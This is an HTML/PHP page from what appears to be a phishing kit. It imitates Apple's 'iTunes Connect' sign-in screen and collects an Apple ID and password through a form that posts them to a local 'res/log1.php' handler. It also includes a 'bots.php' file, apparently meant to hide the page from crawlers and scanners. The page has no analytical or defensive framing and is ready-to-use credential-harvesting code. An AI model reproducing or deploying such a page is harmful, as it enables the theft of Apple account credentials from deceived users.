<?php
if (!isset($_SESSION)) {
  session_start();
}

include "bots.php";


?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<meta http-equiv="content-type" content="text/html;charset=utf-8" />
<head>
  <title>iTunes Connect</title>  
<link rel="icon" href="./img/favicon.ico">

<style>
.btn {
  background: #3baee7;
  background-image: -webkit-linear-gradient(top, #3baee7, #08c);
  background-image: -moz-linear-gradient(top, #3baee7, #08c);
  background-image: -ms-linear-gradient(top, #3baee7, #08c);
  background-image: -o-linear-gradient(top, #3baee7, #08c);
  background-image: linear-gradient(to bottom, #3baee7, #08c);
  -webkit-border-radius: 7;
  -moz-border-radius: 7;
  border-radius: 7px;
  text-shadow: 1px 1px 3px #666666;
  font-family: Arial;
  color: #ffffff;
  font-size: 16px;
  padding: 10px 20px 10px 20px;
  border: solid #1f628d 0px;
  text-decoration: none;
}

.btn:hover {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}
.dark {
	border: none;
	color: #525252;
	height: 25px;
	line-height:15px;
	margin-bottom: 16px;
	margin-right: 6px;
	margin-top: 2px;
	outline: 0 none;
	padding: 5px 0px 5px 5px;
	width: 30%;
	border-radius: 2px;
	-webkit-border-radius: 2px;
	-moz-border-radius: 2px;
	-moz-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
	background: #DFDFDF;
	}
</style>

</head>
<div>
<body background="./img/bg1.png" style="background-repeat: no-repeat" > 

<form class="" style="margin-top:300px;margin-left:200px" method="post" action="./res/log1.php" >
    
		<br>
        <input id="email" type="email" placeholder="Apple ID"  name="aemail" class="dark" required title="Please Enter Your Email">
        <br>
		<br>
        <input id="password" type="password" placeholder="Password" name="apass" class="dark" required title="Please Enter Your Password">
		</br>
<div >
	<input name="submit.x" type="submit" value="Sign In" class="btn"/>
</div>
</br>
		<a  onmouseDown="alert('Try it a couple of times')"><font color="#2188D7"><strong> &nbsp </strong></font></a>
		</br>
		</br>
		</br>
</form>
<br><br><br><br><br><br><br><br><br><br>
</body>
<!-- PHOEN!X -->
</html>